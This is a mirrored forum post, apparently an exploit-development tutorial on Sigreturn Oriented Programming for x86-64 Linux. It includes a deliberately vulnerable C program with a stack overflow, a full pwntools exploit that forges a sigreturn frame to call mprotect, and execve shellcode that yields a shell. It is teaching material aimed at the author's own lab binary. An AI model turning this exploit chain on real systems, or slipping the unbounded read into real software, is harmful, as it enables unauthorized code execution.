<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>SROP | Signals, you say? - Exploit Development - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Sigreturn Oriented Programming
In the name of Allah, the most beneficent, the most merciful. 


Hello everyone to a new boring article, after we took a small look on normal ROP stuff, I decided to write something more fu&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="2890.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="q5dpvdo8349u9YUdJWfjbo8oF"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="q5dpvdo8349u9YUdJWfjbo8oF"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;SROP | Signals, you say?&#39;" href="2890.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/0/0df0da262f0ffab1be896d1c6b6ebce4584e2ef2.gif" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/0/0df0da262f0ffab1be896d1c6b6ebce4584e2ef2.gif" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/srop-signals-you-say/2890" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/srop-signals-you-say/2890" />
<meta property="og:title" content="SROP | Signals, you say?" />
<meta name="twitter:title" content="SROP | Signals, you say?" />
<meta property="og:description" content="Sigreturn Oriented Programming In the name of Allah, the most beneficent, the most merciful.    Hello everyone to a new boring article, after we took a small look on normal ROP stuff, I decided to write something more fun üòÑ! @_py is the one that started that idea! üòâ for learning purposes üòÉ.. I hope you learn much!  ###What‚Äôs so special about SROP?``   It needs only a small syscall; ret; gadget, and a way to set EAX to syscall number of sigreturn!    While you need much gadgets ..." />
<meta name="twitter:description" content="Sigreturn Oriented Programming In the name of Allah, the most beneficent, the most merciful.    Hello everyone to a new boring article, after we took a small look on normal ROP stuff, I decided to write something more fun üòÑ! @_py is the one that started that idea! üòâ for learning purposes üòÉ.. I hope you learn much!  ###What‚Äôs so special about SROP?``   It needs only a small syscall; ret; gadget, and a way to set EAX to syscall number of sigreturn!    While you need much gadgets ..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="exploit" />
<meta property="og:article:tag" content="srop" />
<meta property="og:article:tag" content="linux" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="65 ‚ù§" />
<meta property="article:published_time" content="2017-07-11T19:18:18+00:00" />
<meta property="og:ignore_canonical" content="true" />

        <link rel="next" href="28904658.html?page=2">

    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="2890.html">SROP | Signals, you say?</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/exploit-development/53.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #92278F'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Exploit Development</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/exploit.html' class='discourse-tag' rel="tag">exploit</a>, 
            <a href='../../tag/srop.html' class='discourse-tag' rel="tag">srop</a>, 
            <a href='../../tag/linux.html' class='discourse-tag' rel="tag">linux</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='SROP | Signals, you say?'>
      <link itemprop='url' href='2890.html'>
      <meta itemprop='datePublished' content='2017-07-11T19:18:18Z'>
        <meta itemprop='articleSection' content='Exploit Development'>
      <meta itemprop='keywords' content='exploit, srop, linux'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>

                <link itemprop="mainEntityOfPage" href="2890.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/0/0df0da262f0ffab1be896d1c6b6ebce4584e2ef2.gif">

              <span class="crawler-post-infos">
                  <time  datetime='2017-07-11T19:18:18Z' class='post-time'>
                    July 11, 2017,  7:18pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-25T16:41:57Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h2><a name="p-12816-sigreturn-oriented-programming-1" class="anchor" href="#p-12816-sigreturn-oriented-programming-1"></a>Sigreturn Oriented Programming</h2>
<p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<ul>
<li>Hello everyone to a new boring article, after we took a small look on normal ROP stuff, I decided to write something more fun <img src="../../images/emoji/twitter/smile8e5e.png?v=15" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20">!</li>
<li><a class="mention" href="../../u/_py.html">@_py</a> is the one that started that idea! <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></li>
<li>for learning purposes <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20">..</li>
<li>I hope you learn much!</li>
</ul>
<p>##<span class="hashtag-raw">#What</span>‚Äôs so special about SROP?``</p>
<blockquote>
<p>It needs only a small syscall; ret; gadget, and a way to set EAX to syscall number of sigreturn!</p>
</blockquote>
<ul>
<li>While you need much gadgets to ROP, 1 ~ 2 to SROP!</li>
<li>Sometimes, you need to combine both <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20">..</li>
</ul>
<p>##<a class="hashtag-cooked" href="../../tag/how.html" data-type="tag" data-slug="how" data-id="164" data-style-type="icon" data-icon="tag"><span class="hashtag-icon-placeholder"><svg class="fa d-icon d-icon-square-full svg-icon svg-node"><use href="#square-full"></use></svg></span><span>how</span></a> can we SROP?``</p>
<ul>
<li>We want to exploit the weakness that lies in UNIX systems, sigreturn()..</li>
<li>This function when called, restores all registers from stack, with no further checks..</li>
<li>We know that the signal form looks like this:</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/0df0da262f0ffab1be896d1c6b6ebce4584e2ef2.gif" width="560" height="500"></p>
<h3><a name="p-12816-solving-an-x64-simple-binary-the-srop-way-2" class="anchor" href="#p-12816-solving-an-x64-simple-binary-the-srop-way-2"></a>Solving an x64 simple binary, the SROP way!</h3>
<ul>
<li>Suppose we have an overflow ( Nullbytes shouldn‚Äôt be removed ), allowing us to overwrite the saved RIP.. and a little gadget that will allow us set RAX value to 15 <img src="../../images/emoji/twitter/smile8e5e.png?v=15" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20">..</li>
<li>We can simply set saved RIP to the gadget, and we build a fake signal frame, that‚Äôll allow us do ANYTHING WE WANT, SINCE WE WILL CONTROL ALL REGISTERS <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20">!</li>
<li>Let‚Äôs write a small binary that contains these ingredients <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20">!</li>
</ul>
<pre data-code-wrap="c"><code class="lang-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void syscall_(){
       __asm__("syscall; ret;");
}

void set_rax(){
       __asm__("movl $0xf, %eax; ret;");
}

int main(){
       // ONLY SROP!
       char buff[100];
       printf("Buff @%p, can you SROP?\n", buff);
       read(0, buff, 5000);
       return 0;
}
</code></pre>
<h4><a name="p-12816-lets-start-by-controlling-rip-3" class="anchor" href="#p-12816-lets-start-by-controlling-rip-3"></a>Let‚Äôs start by controlling RIP!</h4>
<ul>
<li>We keep filling the stack until we get SIGSEGV, and we subtract one from it, leading to get the perfect padding! <img src="../../images/emoji/twitter/slight_smile8e5e.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/f/fdc3d6267be7075df7cbc7106d0324e2a1d42904.png" width="518" height="148"></p>
<ul>
<li>The padding to saved RIP is 120 <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20">, let‚Äôs check it!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3ac28738bfeb1fff8e675f113bfa27c83de6556e.png" width="593" height="78"></p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/57b81690b61c02c1f6316d01f865b60c626a1bc5.png" width="271" height="41"></p>
<h4><a name="p-12816-writing-the-exploit-4" class="anchor" href="#p-12816-writing-the-exploit-4"></a>Writing the exploit</h4>
<ul>
<li>We gained control over RIP, let‚Äôs start writing our exploit.py!</li>
</ul>
<pre data-code-wrap="python"><code class="lang-python">#!/usr/bin/python
from pwn import *

context.clear(arch="amd64")
c = process("./srop")
pad = 120

# EXPLOIT
payload = "A" * pad # FILL STACK TILL SAVED RIP
payload += "BBBB" # OVERWRITING SAVED RIP WITH BBBB

# SENDING
c.sendline(payload)

c.interactive()
</code></pre>
<ul>
<li><a href="../../../external.html?link=http://docs.pwntools.com/en/stable/rop/srop.html" rel="noopener nofollow ugc">pwntools</a>.. Always making our life easier <img src="../../images/emoji/twitter/rofl8e5e.png?v=15" title=":rofl:" class="emoji" alt=":rofl:" loading="lazy" width="20" height="20">..</li>
<li>Because of pwntools, we won‚Äôt write the whole chain ( you can write it if you want )! <img src="../../images/emoji/twitter/laughing8e5e.png?v=15" title=":laughing:" class="emoji" alt=":laughing:" loading="lazy" width="20" height="20"></li>
<li>Let‚Äôs first collect, the useful gadgets for our attack!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3c9bb0b45eb4f7fd8d8f64d6290e1402b0a3f9e2.png" width="379" height="43"></p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/608ca4a1b4e6d0d7b916352c1af84adb68fe162f.png" width="427" height="42"></p>
<pre data-code-wrap="python"><code class="lang-python"># ENTRIES
syscall_ret = 0x40054a
mov_rax_15_ret = 0x400554
</code></pre>
<ul>
<li>Also there‚Äôs some kind of leak, the address of buff, is something we have!</li>
<li>Let‚Äôs write a small part to take that leak before sending the payload!</li>
</ul>
<pre data-code-wrap="python"><code class="lang-python"># LEAK
c.recvuntil("@0x")
leak = int(c.recvuntil(",")[:-1], 16)
print "Buff @ " + hex(leak)
</code></pre>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/8/8ba452d1cfb1048bbf3858c354690d94868eb9ea.png" width="437" height="91"></p>
<ul>
<li>All working good! <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></li>
<li>Let‚Äôs now start editing the EXPLOIT part!</li>
<li>The plan i‚Äôm going to do, is to make the Buff address executable, and return to it!</li>
<li>To do so, i‚Äôm going to craft a signalframe that will be able to call mprotect on buff address..</li>
<li>We are going to test on an address, and try making it executable!</li>
</ul>
<pre data-code-wrap="python"><code class="lang-python">pause() # STOP TO ATTACH GDB
test = 0x601000 # TEST ADDRESS
# EXPLOIT
payload = "A" * pad # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret) # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel="amd64") # CREATING A SIGRETURN FRAME
frame.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = test # SET RDI TO TEST ADDRESS
frame.rsi = 2000 # SET RSI TO SIZE
frame.rdx = 7 # SET RDX =&gt; RWX PERMISSION
frame.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME ON STACK
payload += str(frame)
payload += "AAAA" # WHERE IT GOING TO RETURN ( RSP )
</code></pre>
<blockquote>
<p>Stack is going to look like this:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/7/73c128f7d309724ea18993ef18a5b457596170b2.png" data-download-href="/uploads/short-url/gw0KEQeRp66Z1QVndzRKIafB4xs.png?dl=1" title="image.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/73c128f7d309724ea18993ef18a5b457596170b2.png" width="690" height="319"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">image.png</span><span class="informations">1239√ó574 12.3 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
</blockquote>
<ul>
<li>Let‚Äôs run the exploit and attach it!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/8/83ad5067a523cc307eb990cb4b7f33cc181198a0.png" width="578" height="78"></p>
<ul>
<li>Write ‚Äòc‚Äô in GDB to continue, and press enter in exploit.py tab to resume!</li>
<li>BEAAAAAAAAM, RIP in it‚Äôs right place, let‚Äôs check if the address has now RWX permissions!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c1e2260374a098ce76635aee3383b7bd4af9d295.png" width="621" height="110"></p>
<ul>
<li>RWX! let‚Äôs now take advantage of that and instead of test address, we are going to make buff address executable!</li>
</ul>
<pre data-code-wrap="python"><code class="lang-python">pause() # STOP TO ATTACH GDB
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # x86_64 EXECVE SHELLCODE
# EXPLOIT
payload = shellcode # PLACING SHELLCODE IN BEGINNING OF BUFF
payload = payload.ljust(pad, "A") # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret) # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel="amd64") # CREATING A SIGRETURN FRAME
frame.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = leak # SET RDI TO BUFF ADDRESS
frame.rsi = 2000 # SET RSI TO SIZE
frame.rdx = 7 # SET RDX =&gt; RWX PERMISSION
frame.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME ON STACK
payload += str(frame)
payload += p64(leak) # RETURN2SHELLCODE
</code></pre>
<ul>
<li>Let‚Äôs run our exploit! <img src="../../images/emoji/twitter/blush8e5e.png?v=15" title=":blush:" class="emoji" alt=":blush:" loading="lazy" width="20" height="20"></li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/ea5c2fba6a47e5a1d1fe83753673cbdb39d9380d.png" width="408" height="146"></p>
<ul>
<li>We got our shell, we won <img src="../../images/emoji/twitter/smile8e5e.png?v=15" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20">!</li>
</ul>
<h4><a name="p-12816-full-exploit-5" class="anchor" href="#p-12816-full-exploit-5"></a>Full exploit</h4>
<pre data-code-wrap="python"><code class="lang-python">#!/usr/bin/python
from pwn import *

context.clear(arch="amd64")
c = process("./srop")
pad = 120

# ENTRIES
syscall_ret = 0x40054a
mov_rax_15_ret = 0x400554

# LEAK
c.recvuntil("@0x")
leak = int(c.recvuntil(",")[:-1], 16)
print "Buff @ " + hex(leak)

pause() # STOP TO ATTACH GDB
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # x86_64 EXECVE SHELLCODE
# EXPLOIT
payload = shellcode # PLACING SHELLCODE IN BEGINNING OF BUFF
payload = payload.ljust(pad, "A") # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret) # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel="amd64") # CREATING A SIGRETURN FRAME
frame.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = leak # SET RDI TO BUFF ADDRESS
frame.rsi = 2000 # SET RSI TO SIZE
frame.rdx = 7 # SET RDX =&gt; RWX PERMISSION
frame.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME, CAUSE WE STILL NEED TO CONTROL RIP AFTER!
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME IN STACK
payload += str(frame)
payload += p64(leak) # RETURN2SHELLCODE

# SENDING
c.sendline(payload)

c.interactive()
</code></pre>
<p>Reference links:<br>
<a href="../../../external.html?link=https://subs.emis.de/LNI/Proceedings/Proceedings259/2077.pdf" rel="noopener nofollow ugc">PDF</a><br>
<a href="../../../external.html?link=https://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/" rel="noopener nofollow ugc">ThisIsSecurity</a></p>
<h3><a name="p-12816-challenge-on-x86-6" class="anchor" href="#p-12816-challenge-on-x86-6"></a>Challenge on x86</h3>
<ul>
<li>To start your adventure in the SROP world, you should to start simple!</li>
<li>The target is, a simple x86 <a href="../../../external.html?link=https://transfer.sh/z6qEz/mad" rel="noopener nofollow ugc">binary</a>!</li>
</ul>
<blockquote>
<p>Proof that it‚Äôs working, and exploitable:<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/ad09b64cbc3e86dcc0a04836fb8cc56ed04cd074.png" width="418" height="113"></p>
</blockquote>
<ul>
<li>
<p>I made that binary just to help myself understand SROP better, and exploit it on my own <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20">!</p>
</li>
<li>
<p>But now, it‚Äôs your turn, to exploit a such binary!<br>
